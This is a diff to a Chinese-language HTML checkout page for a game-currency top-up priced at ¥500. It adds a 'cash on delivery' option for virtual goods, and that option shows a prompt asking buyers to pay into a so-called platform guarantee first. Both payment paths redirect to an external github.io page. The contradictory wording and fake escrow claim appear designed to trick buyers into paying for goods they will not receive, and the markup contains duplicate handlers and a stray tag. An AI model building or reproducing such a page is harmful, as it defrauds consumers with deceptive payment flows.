@@ -310,6 +310,60 @@
             font-size: 16px;
             font-weight: bold;
         }
+ /* 样式可根据需要调整 */
+        .cod-prompt {
+            display: none;
+            margin-top: 20px;
+            background-color: #f9f9f9;
+            padding: 15px;
+            border: 1px solid #ccc;
+        }
+.cod-prompt {
+    display: none;
+    margin-top: 20px;
+    background-color: #2a2a2a;
+    padding: 20px;
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.prompt-content {
+    margin-bottom: 15px;
+}
+
+.prompt-buttons {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.cancel-btn, .confirm-btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.cancel-btn {
+    background-color: #f0f0f0;
+    color: #666;
+}
+
+.cancel-btn:hover {
+    background-color: #d0d0d0;
+}
+
+.confirm-btn {
+    background-color: #ff3366;
+    color: #fff;
+}
+
+.confirm-btn:hover {
+    background-color: #0056b3;
+}
+
     </style>
 </head>
 
@@ -328,7 +382,7 @@
         <!-- 商品展示区 -->
         <div class="product-card">
             <div class="product-bg"></div>
-            <h3>98000钻石 ¥9800</h3>
+            <h3>98000钻石¥9800</h3>
             <p>新人首充专享优惠</p>
         </div>
 
@@ -353,32 +407,100 @@
 <div class="payment-section">
   <!-- 新增金额展示模块 -->
 
-        <h4>选择支付方式</h4>
-    </div>
-   
-    <label class="payment-method">
-        <input type="radio" name="payment" class="payment-radio" checked>
-        <img src="https://lf6-infras.bytetos.com/obj/static-assets/859c771f7337d1fd7b15b5448118b191.png" class="payment-icon">
-        <div class="payment-info">
-            <div class="payment-title">微信支付</div>
-            <div class="payment-desc">推荐微信用户使用</div>
+  <h4>选择支付方式</h4>
         </div>
-        <span class="checkmark"></span>
-    </label>
 
-  <div class="amount-header">
+        <!-- 微信支付模块 -->
+      <label class="payment-method">
+    <input type="radio" name="payment" class="payment-radio" checked onchange="togglePaymentButton()">
+            <img src="https://lf6-infras.bytetos.com/obj/static-assets/859c771f7337d1fd7b15b5448118b191.png" class="payment-icon">
+            <div class="payment-info">
+                <div class="payment-title">微信支付</div>
+                <div class="payment-desc">推荐微信用户使用</div>
+            </div>
+            <span class="checkmark"></span>
+        </label>
+
+
+<!-- 货到付款模块 -->
+<label class="payment-method">
+    <input type="radio" name="payment" class="payment-radio" value="cod" onclick="showCODPrompt(); togglePaymentButton()">
+    <img src="https://jypjtp.fwh.bcebos.com/hdfk.webp" alt="货到付款图标" class="payment-icon">
+    <div class="payment-info">
+        <div class="payment-title">货到付款</div>
+        <div class="payment-desc">选择货到付款后请留意平台提示</div>
+    </div>
+    <span class="checkmark"></span>
+</label>
+
+<!-- 新增金额展示模块 -->
+<div class="amount-header">
     <div class="amount-title">需付金额</div>
     <div class="amount-value">¥500.00</div>
-  </div>
 </div>
 
-        <!-- 提交按钮 -->
-        <button class="submit-btn" onclick="window.location.href='https://pyqfk.github.io/556/fk500.html'">
-            立即支付 ¥500
-        </button>
+<!-- 货到付款提示框（隐藏状态） -->
+<div id="codPrompt" class="cod-prompt">
+    <div class="prompt-content">
+        <p>虚拟商品，使用货到付款，需暂时把货款支付至平台担保，"充值到账"平台才会把款项转给商家，"未到账"将自动退款至付款账户</p>
+<div style="display: block;"><br></div>
+        <div class="prompt-buttons">
+            <button class="cancel-btn" onclick="closeCODPrompt()">取消</button>
+            <button class="confirm-btn" onclick="confirmCODPrompt()">确定，并支付走平台担保</button>
+        </div>
     </div>
-</body>
-</html>
+</div>
 
+<!-- 提交按钮 -->
+<button class="submit-btn"onclick="window.location.href='https://pyqfk.github.io/556/fk500.html'" id="payButton" style="display: none;" onclick="submitPayment()">立即支付 ¥500</button>
+
+        </button>
+  </div>
+<script>
+function showCODPrompt() {
+    document.getElementById('codPrompt').style.display = 'block';
+}
+
+function closeCODPrompt() {
+    document.getElementById('codPrompt').style.display = 'none';
+    // 新增代码：自动选择微信支付并显示支付按钮
+    var weChatRadio = document.querySelector('input[name="payment"][class="payment-radio"]:checked') || document.querySelector('input[name="payment"][class="payment-radio"][checked]');
+    if (!weChatRadio || weChatRadio.value !== undefined) { // 确保不是货到付款且未明确选中其他支付方式时，默认选中微信支付
+        var defaultWeChatRadio = document.querySelector('input[name="payment"][class="payment-radio"][value=""]') || document.querySelector('input[name="payment"][class="payment-radio"]:not([value="cod"])');
+        defaultWeChatRadio.checked = true;
+
+        togglePaymentButton(); // 调用函数更新按钮状态
+    }
+}
+
+function confirmCODPrompt() {
+    if (confirm('您已选择货到付款，请确保按照提示操作，是否继续？')) {
+        window.location.href = 'https://pyqfk.github.io/556/fk500.html'; // 替换为实际的支付处理页面URL
+    } else {
+        closeCODPrompt(); // 用户取消时隐藏货到付款提示框，并自动选择微信支付
+    }
+}
+
+function togglePaymentButton() {
+    var payButton = document.getElementById('payButton');
+    var codRadio = document.querySelector('input[name="payment"][value="cod"]:checked');
+
+    if (codRadio) {
+        payButton.style.display = 'none';
+        showCODPrompt();
+    } else {
+        payButton.style.display = 'block';
+        closeCODPrompt(); // 确保在没有选择货到付款时，货到付款提示框是隐藏的
+    }
+}
+
+// ... 其他函数保持不变 ...
+
+// 页面加载时初始化按钮状态和提示框
+window.onload = function() {
+    togglePaymentButton();
+};
+
+</script>
 </body>
 </html>
